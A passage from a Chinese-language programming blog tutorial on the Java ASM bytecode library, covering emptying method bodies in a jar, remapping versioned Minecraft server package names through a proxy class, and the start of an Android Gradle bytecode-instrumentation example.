operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTableSwitchInsn</span><span class="token punctuation">(</span>min<span class="token operator">:</span> Int<span class="token punctuation">,</span> max<span class="token operator">:</span> Int<span class="token punctuation">,</span> dflt<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword">vararg</span> labels<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLookupSwitchInsn</span><span class="token punctuation">(</span>dflt<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> keys<span class="token operator">:</span> IntArray<span class="token operator">?</span><span class="token punctuation">,</span> labels<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> Label<span class="token operator">&gt;</span><span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMultiANewArrayInsn</span><span class="token punctuation">(</span>descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> numDimensions<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTryCatchBlock</span><span class="token punctuation">(</span>start<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> end<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> handler<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLocalVariable</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> start<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> end<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">,</span> index<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLineNumber</span><span class="token punctuation">(</span>line<span class="token operator">:</span> Int<span class="token punctuation">,</span> start<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitFrame</span><span class="token punctuation">(</span>type<span class="token operator">:</span> Int<span class="token punctuation">,</span> numLocal<span class="token operator">:</span> Int<span class="token punctuation">,</span> local<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> Any<span class="token operator">&gt;</span><span class="token operator">?</span><span class="token punctuation">,</span> numStack<span class="token operator">:</span> Int<span class="token punctuation">,</span> stack<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> Any<span class="token operator">&gt;</span><span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> owner<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> owner<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> owner<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> isInterface<span class="token operator">:</span> Boolean<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitInvokeDynamicInsn</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span> bootstrapMethodHandle<span class="token operator">:</span> Handle<span class="token operator">?</span><span class="token punctuation">,</span> <span class="token keyword">vararg</span> bootstrapMethodArguments<span class="token operator">:</span> Any<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">generate</span><span class="token punctuation">(</span>        <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Rain\\Desktop\\recaf-2.21.13-J8-jar-with-dependencies.jar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                          <span class="token function">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Rain\\Desktop\\recaf-empty.jar"</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面我们让EmptyClassVisitor在visitMethod返回了一个我们自定义的EmptyMethodVisitor，也就是说在访问方法时执行的是在EmptyMethodVisitor中我们自定义的逻辑。而在EmptyMethodVisitor中我们重写了所有方法，把原本的执行父类方法的逻辑删除。这样在访问时便不会想原本一样生成跟之前一样的字节码，而是什么都不做，这样就删掉了方法中方法体的字节码。</p><h5 id="ASMVersionControl"><a href="#ASMVersionControl" class="headerlink" title="ASMVersionControl"></a>ASMVersionControl</h5><blockquote><p>这是在Minecraft服务端插件开发经常中遇见的问题</p><p>众所周知，目前主流的minecraft服务端都是第三方反编译官方服务端的代码后对其进行封装而来的，而作为服务端插件开发者，我们大部分时候只需要用到第三方封装的API，但也有例外。</p><p>当我们需要调用官方服务端的代码，我们会发现一个问题：不同版本的服务端的官方服务端代码的包名不一样，它们被版本号分隔开来。</p><p>比如，在Minecraft 1.16.5版本的官方代码中，所有类都在<code>net.minecraft.server.v1_16_R3</code>包下</p><p>但在Minecraft 1.12.2版本的代码中，所有类都在<code>net.minecraft.server.v1_12_R1</code>包下</p><p>关键是它们之间的代码其实没有很大的改动，就是包名不一样了</p><p>考虑到版本兼容问题，开发者一般不会直接调用<code>n.m.s</code>包下的代码，在ASMVersionControl这个解决方案诞生之前，一般有两种解决方案</p><ul><li>运行时获取版本号，然后拼接字符串通过反射调用</li><li>为不同版本写多份代码，再在运行时判断当前运行版本来决定调用哪一份</li></ul><p>这两种解决方案都不太尽人意。反射调用不仅麻烦，还会导致额外的性能开销。而编写多份代码更是白白增加了开发者的工作量，而且需要导入多个版本的服务端核心依赖，导包的时候及其容易导错。</p><p>这时候<code>ASMVersionControl</code>应运而生，开发者只需要在一个实现类中写一份代码，便可以通过ASM动态代理得到一个实例。开发者可以放心调用实例中的方法，因为这个实例已经被asm修改过了，所有<code>n.m.s</code>调用的包名的版本号部分全部被修改为了运行环境的版本号。</p></blockquote><p>这部分逻辑其实ASM已经提供了一个现成的工具<code>ClassRemapper</code>来实现，但它本质上也是一个被封装过的<code>ClassVisitor</code>，为了方便理解，我们使用ClassVisitor实现。</p><p>如果你想知道使用ClassRemapper如何实现，看这里<a href="https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt">taboolib/MinecraftRemapper.kt at master · TabooLib/taboolib (github.com)</a></p><p>或者你也可以试着自己实现一下ClassRemapper的封装，比较简单。</p><p>我们先模拟两个“不同版本”下的类，也就是包名不同，但方法声明相同，实现略有不同的两个类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// net.minecraft.server.v1_12_R1</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"execute successfully v1.12"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// net.minecraft.server.v1_16_R3</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"execute successfully v1.16"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>理想的状态是，我要让我调用<code>net.minecraft.server.v1_12_R1</code>的所有方法全部变成<code>net.minecraft.server.v1_16_R3</code>。</p><p>我们先写一段伪代码</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">import</span> net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>server<span class="token punctuation">.</span>v1_12_R1<span class="token punctuation">.</span>Test<span class="token keyword">interface</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> NMSHandlerImpl <span class="token operator">:</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 获得asm修改过的代理对象</span>    <span class="token keyword">val</span> nmsProxy<span class="token operator">:</span> NMSHandler <span class="token operator">=</span> createProxyInstance<span class="token operator">&lt;</span>NMSHandler<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    nmsProxy<span class="token punctuation">.</span><span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 这里输出 execute successfully v1.16, 说明我们修改成功了</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先看看<code>NMSHandlerImpl#callTest</code>的字节码指令</p><blockquote><p>   L0<br>    LINENUMBER 85 L0<br>    NEW net/minecraft/server/v1_12_R1/Test<br>    DUP<br>    INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V<br>    INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V<br>   L1<br>    LINENUMBER 86 L1<br>    RETURN<br>   L2<br>    LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0<br>    MAXSTACK = 2<br>    MAXLOCALS = 1</init></p></blockquote><p>我们只需要修改其中所有的 <code>net/minecraft/server/v1_12_R1/Test</code>为<code>net/minecraft/server/v1_16_R3/Test</code>即可，目前为止我们知道我们肯定首先要先visitMethod，然后在具体的操作方法。</p><blockquote><p>需要修改的指令：</p><ul><li><p>NEW net/minecraft/server/v1_12_R1/Test</p></li><li><p>INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V</init></p></li><li><p>INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V</p></li></ul></blockquote><p>在<a href="https://www.bilibili.com/read/cv13433468">Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)</a>对照</p><p>发现我们只需要重写<code>visitTypeInsn</code>, <code>visitMethodInsn</code>，并在里面替换对应的参数即可。</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">VersionControlMethodVisitor</span><span class="token punctuation">(</span>methodVisitor<span class="token operator">:</span> MethodVisitor<span class="token punctuation">,</span> <span class="token keyword">private</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">MethodVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> methodVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> type<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>        opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span>        owner<span class="token operator">:</span> String<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token punctuation">,</span>        isInterface<span class="token operator">:</span> Boolean    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> owner<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> isInterface<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完整代码如下:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">import</span> net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>server<span class="token punctuation">.</span>v1_12_R1<span class="token punctuation">.</span>Test<span class="token keyword">class</span> <span class="token function">VersionControlClassVisitor</span><span class="token punctuation">(</span>classVisitor<span class="token operator">:</span> ClassVisitor<span class="token punctuation">,</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">ClassVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> classVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitField</span><span class="token punctuation">(</span>        access<span class="token operator">:</span> Int<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        value<span class="token operator">:</span> Any<span class="token operator">?</span>    <span class="token punctuation">)</span><span class="token operator">:</span> FieldVisitor <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">VersionControlFieldVisitor</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitField</span><span class="token punctuation">(</span>access<span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> currentVersion<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethod</span><span class="token punctuation">(</span>        access<span class="token operator">:</span> Int<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        exceptions<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> String<span class="token operator">&gt;</span><span class="token operator">?</span>    <span class="token punctuation">)</span><span class="token operator">:</span> MethodVisitor <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">VersionControlMethodVisitor</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>access<span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> exceptions<span class="token punctuation">)</span><span class="token punctuation">,</span> currentVersion<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">VersionControlMethodVisitor</span><span class="token punctuation">(</span>methodVisitor<span class="token operator">:</span> MethodVisitor<span class="token punctuation">,</span> <span class="token keyword">private</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">MethodVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> methodVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> type<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>        opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span>        owner<span class="token operator">:</span> String<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token punctuation">,</span>        isInterface<span class="token operator">:</span> Boolean    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> owner<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>currentVersion<span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> isInterface<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">VersionControlFieldVisitor</span><span class="token punctuation">(</span>fieldVisitor<span class="token operator">:</span> FieldVisitor<span class="token punctuation">,</span> <span class="token keyword">val</span> currentVersion<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">FieldVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> fieldVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">val</span> nms <span class="token operator">=</span> <span class="token string">"net/minecraft/server/v1_.*?/"</span><span class="token punctuation">.</span><span class="token function">toRegex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">val</span> obc <span class="token operator">=</span> <span class="token string">"org/bukkit/craftbukkit/v1_.*?/"</span><span class="token punctuation">.</span><span class="token function">toRegex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">fun</span> String<span class="token punctuation">.</span><span class="token function">modifyVersion</span><span class="token punctuation">(</span>version<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token operator">:</span> String <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>nms<span class="token punctuation">,</span> <span class="token string">"net/minecraft/server/<span class="token interpolation variable">$version</span>/"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>obc<span class="token punctuation">,</span> <span class="token string">"org/bukkit/craftbukkit/<span class="token interpolation variable">$version</span>/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token annotation builtin">@Suppress</span><span class="token punctuation">(</span><span class="token string">"UNCHECKED_CAST"</span><span class="token punctuation">)</span><span class="token keyword">inline</span> <span class="token keyword">fun</span> <span class="token operator">&lt;</span><span class="token keyword">reified</span> T<span class="token operator">&gt;</span> <span class="token function">createProxyClass</span><span class="token punctuation">(</span>impl<span class="token operator">:</span> String <span class="token operator">=</span> T<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"Impl"</span><span class="token punctuation">)</span><span class="token operator">:</span> Class<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> input <span class="token operator">=</span> VersionControlClassVisitor<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">.</span>classLoader<span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>impl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>    <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span>ClassWriter<span class="token punctuation">.</span>COMPUTE_MAXS<span class="token punctuation">)</span>    classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token function">VersionControlClassVisitor</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">,</span> <span class="token string">"v1_16_R3"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> MyClassLoader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>impl<span class="token punctuation">,</span> classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> Class<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token keyword">inline</span> <span class="token keyword">fun</span> <span class="token operator">&lt;</span><span class="token keyword">reified</span> T<span class="token operator">&gt;</span> <span class="token function">createProxyInstance</span><span class="token punctuation">(</span>impl<span class="token operator">:</span> String <span class="token operator">=</span> T<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"Impl"</span><span class="token punctuation">)</span><span class="token operator">:</span> T <span class="token punctuation">{</span>    <span class="token keyword">return</span> createProxyClass<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">(</span>impl<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">interface</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> NMSHandlerImpl <span class="token operator">:</span> NMSHandler <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> proxy <span class="token operator">=</span> createProxyInstance<span class="token operator">&lt;</span>NMSHandler<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    proxy<span class="token punctuation">.</span><span class="token function">callTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这段代码的运行结果是<code>execute successfully v1.16</code>,证明我们成功替换了代理类中的包名。</p><p>其实gradle插件shadowJar重定向(relocate)包名的功能的实现也大同小异，大家有兴趣可以课下自己去实现一下。</p><h5 id="字节码插桩"><a href="#字节码插桩" class="headerlink" title="字节码插桩"></a>字节码插桩</h5><p>前面几个其实并不是我们安卓开发经常遇到的问题，只是它们解决起来相对简单。安卓开发中asm框架主要是用来字节码插桩的。</p><p>字节码插桩其实是hook的一种。</p><p>这个我们就不自己写了，我们分析一下大佬写的案例——用字节码插桩实现双击防抖。</p><p>先贴下源码链接: <a href="https://github.com/leavesCZY/ASM_Transform">leavesCZY/ASM_Transform: ASM Transform 字节码插桩实战 (github.com)</a></p><p>谷歌为android量身定制了安卓字节码插桩的解决方案<code>transform api</code>来配合gradle使用，<em><strong>不过它现在已经即将废弃了，最新的解决方案是Gradle提供的TransformAction</strong></em>，不过这里我们要看的源码仍然是使用transform api来实现字节码插桩，不过问题不大。</p><h6 id="gradle插件编写"><a href="#gradle插件编写" class="headerlink" title="gradle插件编写"></a>gradle插件编写</h6><blockquote><p>字节码插桩一般都是通过自定义gradle插件干预编译实现的</p><p>准确来说是在编译后再对编译产物处理一遍</p></blockquote><p>首先我们新建一个<code>buildSrc</code>模块，<code>buildSrc</code>模块中的代码可以在其他模块的build.gradle中直接引入使用。</p><p>然后创建一个插件类</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * @Author: leavesCZY * @Date: 2021/12/2 16:02 * @Desc: */</span><span class="token keyword">class</span> DoubleClickPlugin <span 